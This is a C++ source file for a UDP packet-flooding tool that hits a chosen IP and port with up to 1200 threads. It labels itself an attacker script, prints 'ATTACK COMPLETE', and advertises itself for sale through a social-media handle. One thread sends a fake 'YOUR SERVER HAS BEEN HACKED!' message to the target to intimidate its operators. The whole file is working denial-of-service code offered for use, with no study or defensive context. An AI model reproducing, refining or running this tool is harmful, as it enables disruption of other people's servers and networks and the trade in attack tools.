#include <iostream>
#include <iomanip>
#include <thread>
#include <vector>
#include <mutex>
#include <chrono>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string>
#include <cstring>
#include <fcntl.h> // For non-blocking socket

#define MAX_PACKET_SIZE 65507
#define FAKE_ERROR_DELAY 677
#define MIN_PACKET_SIZE 1
#define DEFAULT_NUM_THREADS 1200

long long totalPacketsSent = 0;
long long totalPacketsReceived = 0;
double totalDataMB = 0.0;
std::mutex statsMutex;
bool keepSending = true;
bool keepReceiving = true;

// Attacker: Packet Sender Function (unchanged)
void packetSender(int threadId, const std::string& targetIp, int targetPort, int durationSeconds, int packetSize, int numThreads) {
    int udpSocket;
    struct sockaddr_in serverAddr;
    char* packet = new char[packetSize];
    std::memset(packet, 'A', packetSize);
    packet[packetSize - 1] = '\0';

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        delete[] packet;
        return;
    }

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = inet_addr(targetIp.c_str());
    serverAddr.sin_port = htons(targetPort);

    long long threadPackets = 0;
    double threadDataMB = 0.0;
    auto startTime = std::chrono::steady_clock::now();

    if (threadId == 0) {
        std::this_thread::sleep_for(std::chrono::milliseconds(FAKE_ERROR_DELAY));
        const char* fakeMessage = "YOUR SERVER HAS BEEN HACKED! TYPE 'okay' OR 'no' TO RESPOND (TRAP WARNING)";
        ssize_t bytesSent = sendto(udpSocket, fakeMessage, strlen(fakeMessage), 0,
                                 (struct sockaddr*)&serverAddr, sizeof(serverAddr));
        if (bytesSent > 0) {
            threadPackets++;
            threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
        }
    }

    while (keepSending) {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - startTime).count();
        if (elapsed >= durationSeconds) break;

        ssize_t bytesSent = sendto(udpSocket, packet, packetSize, 0,
                                 (struct sockaddr*)&serverAddr, sizeof(serverAddr));
        if (bytesSent > 0) {
            threadPackets++;
            threadDataMB += static_cast<double>(bytesSent) / (1024.0 * 1024.0);
        }
    }

    std::cout << "Thread " << threadId << ": Sent " << threadPackets
              << " packets (" << std::fixed << std::setprecision(2) << threadDataMB << " MB)\n";

    {
        std::lock_guard<std::mutex> lock(statsMutex);
        totalPacketsSent += threadPackets;
        totalDataMB += threadDataMB;
    }

    close(udpSocket);
    delete[] packet;
}

// Attacker: Packet Receiver Function (modified for non-blocking)
void packetReceiver(int listenPort, int packetSize) {
    int udpSocket;
    struct sockaddr_in serverAddr, clientAddr;
    char* buffer = new char[packetSize];
    socklen_t clientLen = sizeof(clientAddr);

    udpSocket = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (udpSocket < 0) {
        delete[] buffer;
        return;
    }

    // Set socket to non-blocking
    int flags = fcntl(udpSocket, F_GETFL, 0);
    fcntl(udpSocket, F_SETFL, flags | O_NONBLOCK);

    serverAddr.sin_family = AF_INET;
    serverAddr.sin_addr.s_addr = INADDR_ANY;
    serverAddr.sin_port = htons(listenPort);

    if (bind(udpSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        close(udpSocket);
        delete[] buffer;
        return;
    }

    while (keepReceiving) {
        ssize_t bytes = recvfrom(udpSocket, buffer, packetSize, 0,
                               (struct sockaddr*)&clientAddr, &clientLen);
        if (bytes > 0) {
            std::lock_guard<std::mutex> lock(statsMutex);
            totalPacketsReceived++;
        }
        else if (bytes < 0 && errno != EAGAIN && errno != EWOULDBLOCK) {
            break; // Exit on error that's not "no data available"
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Prevent tight loop
    }

    close(udpSocket);
    delete[] buffer;
}

// Attacker: Main Function
int main(int argc, char* argv[]) {
    std::cout << "\n";
    std::cout << "=======================================\n";
    std::cout << "  Welcome to Rohan Server\n";
    std::cout << "  This is fully working script\n";
    std::cout << "  DM to buy at - @Rohan2349\n";
    std::cout << "  Unleash the power of packet storm!\n";
    std::cout << "=======================================\n";
    std::cout << "\n";

    if (argc < 5 || argc > 6) {
        std::cerr << "Usage: " << argv[0] << " <ip> <port> <time> <packet_size> [threads]\n";
        std::cerr << "Example: " << argv[0] << " 127.0.0.1 12345 10 1000 1200\n";
        std::cerr << "Threads optional, defaults to " << DEFAULT_NUM_THREADS << "\n";
        return 1;
    }

    std::string targetIp = argv[1];
    int targetPort = std::stoi(argv[2]);
    int durationSeconds = std::stoi(argv[3]);
    int packetSize = std::stoi(argv[4]);
    int numThreads = (argc == 6) ? std::stoi(argv[5]) : DEFAULT_NUM_THREADS;

    if (targetIp.empty()) targetIp = "127.0.0.1";
    if (durationSeconds <= 0) durationSeconds = 10;
    if (packetSize < MIN_PACKET_SIZE || packetSize > MAX_PACKET_SIZE) packetSize = 1000;
    if (numThreads <= 0) numThreads = DEFAULT_NUM_THREADS;

    std::cout << "Starting receiver thread...\n";
    std::thread receiverThread(packetReceiver, targetPort, packetSize);

    std::vector<std::thread> senderThreads;
    for (int i = 0; i < numThreads; ++i) {
        senderThreads.emplace_back(packetSender, i, targetIp, targetPort, durationSeconds, packetSize, numThreads);
    }

    std::cout << "Sending packets to " << targetIp << ":" << targetPort
              << " for " << durationSeconds << " seconds with " << numThreads
              << " threads and packet size " << packetSize << " bytes...\n";

    for (auto& t : senderThreads) {
        t.join();
    }

    std::cout << "All sender threads completed...\n";
    keepSending = false;
    
    std::this_thread::sleep_for(std::chrono::seconds(1));
    keepReceiving = false;
    
    std::cout << "Waiting for receiver thread to join...\n";
    receiverThread.join();
    std::cout << "Receiver thread joined...\n";

    std::cout << "\nATTACK COMPLETE\n";
    std::cout << "Total Packet Size: " << totalPacketsSent << " packets\n";
    std::cout << "Total Data: " << std::fixed << std::setprecision(2) << totalDataMB << " MB\n";
    std::cout << "DM to buy at - @Rohan2349\n";

    return 0;
}
//@MADE BY YOUR FATHER - @Rohan2349